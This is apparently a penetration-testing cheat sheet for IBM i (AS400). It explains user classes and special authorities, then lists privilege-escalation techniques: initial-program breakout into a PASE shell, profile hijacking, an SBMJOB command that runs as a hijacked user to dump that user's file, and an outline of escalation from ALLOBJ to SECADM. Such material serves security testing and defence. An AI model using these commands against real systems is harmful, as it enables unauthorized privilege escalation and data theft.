# AS400

AS400 (IBM i) is a midrange computer system developed by IBM, originally released in 1988. Now known as IBM i running on Power Systems, it is widely used for business applications due to its stability, security, and integrated database (DB2 for i)

    ```

## User Classes

A User Class (USRCLS) defines a predefined set of authorities and system privileges for a user profile. It determines the user's general role and access level within the system. However, a user class alone does not directly grant special authorities (SPCAUT); instead, it serves as a guideline for assigning them.

In this example, we create a high-privilege user by assigning them the *SECOFR (Security Officer) user class (USRCLS). By setting the special authority attribute (SPCAUT) to*USRCLS, the system automatically grants the user all special authorities associated with the *SECOFR class.

```ps1
CRTUSRPRF USRPRF(MYUSER) USRCLS(*SECOFR) SPCAUT(*USRCLS)
```

| User Classes                     | Special Authority from User Classes                                                  |
| -------------------------------- | ------------------------------------------------------------------------------------ |
| *SECOFR (Security Officer)       | Full system control, including user management and security. All special authorities |
| *SECADM (Security Administrator) | Can manage users but not system-wide settings. *SECADM special authority             |
| *SYSOPR (System Operator)        | Can manage system operations but not security settings. *SAVSYS and*JOBCTL special authority |
| *ALLOBJ (All Object Authority)   | Can access all objects but may lack security control.                                |
| *PGMR                            | Can create and modify programs but has limited access to system administration functions. No special authorities |
| *USER                            | Standard user with minimal privileges, typically for general system use. No special authorities |

## Authority

In AS400 (IBM i), authority controls user access to system objects (libraries, files, programs, etc.). It ensures security by defining what users can do with specific objects.

* `*ALL`: Full access (read, write, delete, execute).
* `*CHANGE`: Modify but not delete.
* `*EXCLUDE`: No access.
* `*USE`: Read-only or execute.
* `*USERDEF`: Custom authority settings based on a user's specific needs.

## Special Authority

Special authority is used to specify the types of actions a user can perform on system resources. A user can be given one or more special authorities.

* `*ALLOBJ` special authority: All-object (`*ALLOBJ`) special authority allows the user to access any resource on the system whether private authority exists for the user.
* `*SECADM` special authority: Security administrator (`*SECADM`) special authority allows a user to create, change, and delete user profiles.
* `*JOBCTL` special authority: The Job control (`*JOBCTL`) special authority allows a user to change the priority of jobs and of printing, end a job before it has finished, or delete output before it has printed. `*JOBCTL` special authority can also give a user access to confidential spooled output, if output queues are specified `OPRCTL(*YES)`.
* `*SPLCTL` special authority: Spool control (`*SPLCTL`) special authority allows the user to perform all spool control functions, such as changing, deleting, displaying, holding and releasing spooled files.
* `*SAVSYS` special authority: Save system (`*SAVSYS`) special authority gives the user the authority to save, restore, and free storage for all objects on the system, regardless of whether the user has object existence authority to the objects.
* `*SERVICE` special authority: Service (`*SERVICE`) special authority allows the user to start system service tools using the STRSST command. This special authority allows the user to debug a program with only `*USE` authority to the program and perform the display and alter service functions. It also allows the user to perform trace functions.
* `*AUDIT` special authority: Audit (`*AUDIT`) special authority gives the user the ability to view and change auditing characteristics.
* `*IOSYSCFG` special authority: System configuration (`*IOSYSCFG`) special authority gives the user the ability to change how the system is configured. Users with this special authority can add or remove communications configuration information, work with TCP/IP servers, and configure the internet connection server (ICS). Most commands for configuring communications require `*IOSYSCFG` special authority.

```ps1
# Print users with special authorities
PRTUSRPRF TYPE(*ALL) SELECT(*SPCAUT) SPCAUT(*ALL)

# Print rights on a library object
DSPOBJAUT OBJ(MYLIB) OBJTYPE(*LIB)
```

**QSECOFR** (short for Security Officer) is the highest-level user profile, similar to the "root" user in Unix/Linux or the "Administrator" account in Windows. It has full control over the system, including security settings, user management, and system configuration.

The `*ALLOBJ` (All Object Authority) special authority allows a user to access all objects on the system, regardless of their specific object-level permissions. A user with this authority can perform almost any action on the system, making it a powerful and sensitive privilege.

**QSECOFR** has `*ALLOBJ` by default, along with other special authorities, making it the most powerful user profile on IBM i.

## Password Cracking

## Privilege Escalation

### Initial Program Breakout

* Click "`Attn`" button. The attention interrupt key (ATTN) allows the authenticated user to interrupt/end a process and display a menu with additional functions.
* Press `F9` to run commands

```ps1
# Spawn a PASE shell
CALL QP2TERM

# Execute a script
CALL QP2SHELL PARM('/QOpenSys/usr/bin/sh' + '/tmp/scr')
```

### Hijack Profile - SECOFR Security Class

User profiles assigned with the `*SECOFR` (Security Officer) security class are automatically granted `*ALLOBJ` (All Object) authority, giving them unrestricted access to all system objects. Refer to [User Classes](#user-classes)

Display a user profile in several different formats with `DSPUSRPRF`.

```ps1
DSPUSRPRF <username>
```

### Hijack Profile - Authorities

* Print Public Authority: any user profiles have authority that is not set to the default of `*PUBLIC AUT(*EXCLUDE)`

    ```ps1
    PRTPUBAUT OBJTYPE(*USRPRF)
    ```

* Print Private Authority

    ```ps1
    PRTPVTAUT OBJTYPE(*USRPRF)
    ```

Look for `*USE` rights or better(e.g. `*CHANGE`, `*ALL`) to someone else's User Profile.

This `SBMJOB` command will submit a batch job to run under the `HIJACKED_USER` user profile, and will print out the records in the `FILE_OF_HIJACKED_USER` file where the `HIJACKED_USER` User Profile have access.

> The Submit Job (SBMJOB) command allows a job that is running to submit another job to a job queue to be run later as a batch job. Only one element of request data can be placed on the new job's message queue. - [IBM/SBMJOB](https://www.ibm.com/docs/en/i/7.4?topic=ssw_ibm_i_74/cl/sbmjob.html)

```ps1
SBMJOB CMD(CPYF FROMFILE(FILE_OF_HIJACKED_USER) TOFILE(*PRINT)) USER(HIJACKED_USER)
```

### Hijack Profile - User Profile Swap

* Check the list of profiles
* Grab a profile handle
* Switch to the profile
* Repeat until you have obtained the highest access level

### From ALLOBJ to SECADM

* Query users informations:

    ```c
    DSPUSRPRF USRPRF(*ALL) TYPE(*BASIC) OUTPUT(*OUTFILE) OUTFILE(PENTEST/USERDB)
    ```

* Create a CL script to escalate privilege and compile it with `STRPDM` (output is `PRIVESC`)
* Call the generated PGM (program object): `CALL PENTEST/PRIVESC USERWITHSECADM`
